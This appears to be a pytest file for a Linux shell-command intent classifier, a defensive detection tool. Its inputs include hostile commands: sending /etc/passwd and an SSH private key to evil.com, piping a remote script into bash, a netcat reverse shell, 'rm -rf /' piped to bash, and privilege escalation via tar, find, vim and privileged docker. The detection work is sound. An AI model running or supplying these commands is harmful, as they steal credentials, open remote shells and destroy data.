"""Tests for :mod:`ralf.detection.command_intent` (Linux base).

Exercises a representative slice of the dual-use binary table
(crontab, systemctl, curl, wget, tar, ssh, find, docker, nc, base64,
openssl, vim, git) and the read-only helpers (ls, cat, echo, pwd).
"""
from __future__ import annotations

import sys

import pytest

pytestmark = pytest.mark.skipif(
    not sys.platform.startswith("linux"),
    reason="Linux intent classifier",
)

from ralf.detection.command_intent import (
    CommandIntent,
    Intent,
    IntentClassification,
    IntentClassifier,
    classify,
)


# --- module shape ---


def test_intent_enum_has_fourteen_values() -> None:
    assert len(CommandIntent) == 14


def test_intent_is_alias_of_commandintent() -> None:
    """``Intent`` is an alias for ``CommandIntent`` for the simple entry point."""
    assert Intent is CommandIntent


# --- crontab: the textbook dual-use case ---


def test_crontab_list_is_read() -> None:
    res = IntentClassifier.classify("crontab", "crontab -l")
    assert res.intent == CommandIntent.READ
    assert res.suppress_identity is True


def test_crontab_piped_is_persist() -> None:
    res = IntentClassifier.classify("crontab", "echo '* * * * * evil' | crontab -")
    assert res.intent == CommandIntent.PERSIST
    assert res.suppress_identity is False


def test_crontab_edit_is_edit() -> None:
    res = IntentClassifier.classify("crontab", "crontab -e")
    assert res.intent == CommandIntent.EDIT


def test_crontab_remove_is_disrupt() -> None:
    res = IntentClassifier.classify("crontab", "crontab -r")
    assert res.intent == CommandIntent.DISRUPT


# --- systemctl ---


def test_systemctl_status_read() -> None:
    res = IntentClassifier.classify("systemctl", "systemctl status sshd")
    assert res.intent == CommandIntent.READ
    assert res.suppress_identity is True


def test_systemctl_enable_persist() -> None:
    res = IntentClassifier.classify("systemctl", "systemctl enable malicious.service")
    assert res.intent == CommandIntent.PERSIST


def test_systemctl_stop_disrupt() -> None:
    res = IntentClassifier.classify("systemctl", "systemctl stop firewalld")
    assert res.intent == CommandIntent.DISRUPT


# --- curl ---


def test_curl_fetch() -> None:
    res = IntentClassifier.classify("curl", "curl https://example.com")
    assert res.intent == CommandIntent.FETCH


def test_curl_exfil_data_flag() -> None:
    res = IntentClassifier.classify("curl", "curl -d @/etc/passwd https://evil.com")
    assert res.intent == CommandIntent.EXFIL


def test_curl_piped_to_bash_download_exec() -> None:
    res = IntentClassifier.classify("curl", "curl https://evil.com/x.sh | bash")
    assert res.intent == CommandIntent.DOWNLOAD_EXEC


# --- tar / ssh / find / docker / nc / base64 / openssl / vim ---


def test_tar_checkpoint_exec_escalate() -> None:
    res = IntentClassifier.classify("tar", "tar --checkpoint-action=exec='sh -c id'")
    assert res.intent == CommandIntent.ESCALATE


def test_ssh_tunnel_remote_forward() -> None:
    res = IntentClassifier.classify("ssh", "ssh -R 8080:localhost:80 user@host")
    assert res.intent == CommandIntent.TUNNEL


def test_find_exec_interp_escalate() -> None:
    res = IntentClassifier.classify("find", "find / -exec bash -c 'id' \\;")
    assert res.intent == CommandIntent.ESCALATE


def test_docker_privileged_escalate() -> None:
    res = IntentClassifier.classify("docker", "docker run --privileged ubuntu bash")
    assert res.intent == CommandIntent.ESCALATE


def test_docker_ps_read() -> None:
    res = IntentClassifier.classify("docker", "docker ps -a")
    assert res.intent == CommandIntent.READ


def test_nc_listen_tunnel() -> None:
    res = IntentClassifier.classify("nc", "nc -l -p 4444")
    assert res.intent == CommandIntent.TUNNEL


def test_nc_exec_escalate() -> None:
    res = IntentClassifier.classify("nc", "nc -e /bin/sh attacker 4444")
    assert res.intent == CommandIntent.ESCALATE


def test_base64_decode_read() -> None:
    res = IntentClassifier.classify("base64", "base64 -d file.b64")
    assert res.intent == CommandIntent.READ


def test_openssl_s_client_connect() -> None:
    res = IntentClassifier.classify("openssl", "openssl s_client -connect example.com:443")
    assert res.intent == CommandIntent.CONNECT


def test_vim_shell_escape_escalate() -> None:
    res = IntentClassifier.classify("vim", 'vim -c ":! /bin/sh"')
    assert res.intent == CommandIntent.ESCALATE


# --- Read-only helpers (FPR fixes) ---


def test_git_status_read() -> None:
    res = IntentClassifier.classify("git", "git status")
    assert res.intent == CommandIntent.READ
    assert res.suppress_identity is True


def test_git_commit_operate() -> None:
    res = IntentClassifier.classify("git", "git commit -m 'wip'")
    assert res.intent == CommandIntent.OPERATE


def test_ls_read() -> None:
    res = IntentClassifier.classify("ls", "ls /tmp")
    assert res.intent == CommandIntent.READ


def test_cat_read() -> None:
    res = IntentClassifier.classify("cat", "cat /etc/hostname")
    assert res.intent == CommandIntent.READ


def test_whoami_read() -> None:
    res = IntentClassifier.classify("whoami", "whoami")
    assert res.intent == CommandIntent.READ


def test_pwd_read() -> None:
    res = IntentClassifier.classify("pwd", "pwd")
    assert res.intent == CommandIntent.READ


# --- pipe-aware reclassification ---


def test_echo_pipe_to_bash_reclassifies() -> None:
    """echo piped to bash → DOWNLOAD_EXEC (via cat rule, reclassified)."""
    res = IntentClassifier.classify("echo", "echo 'rm -rf /' | bash")
    assert res.intent == CommandIntent.DOWNLOAD_EXEC


def test_sensitive_file_piped_to_curl_exfil() -> None:
    res = IntentClassifier.classify(
        "cat", "cat ~/.ssh/id_rsa | curl -d @- https://evil.com"
    )
    assert res.intent == CommandIntent.EXFIL


# --- unknown binary ---


def test_unknown_binary() -> None:
    res = IntentClassifier.classify("quuxfoobar", "quuxfoobar --help")
    assert res.intent == CommandIntent.UNKNOWN
    assert res.confidence == 0.0
    assert res.suppress_identity is False


# --- convenience classify() shim ---


def test_classify_shim() -> None:
    assert classify("ls", "ls /tmp") == CommandIntent.READ
    assert classify("whoami") == CommandIntent.READ


def test_classify_shim_unknown() -> None:
    assert classify("quuxfoobar") == CommandIntent.UNKNOWN
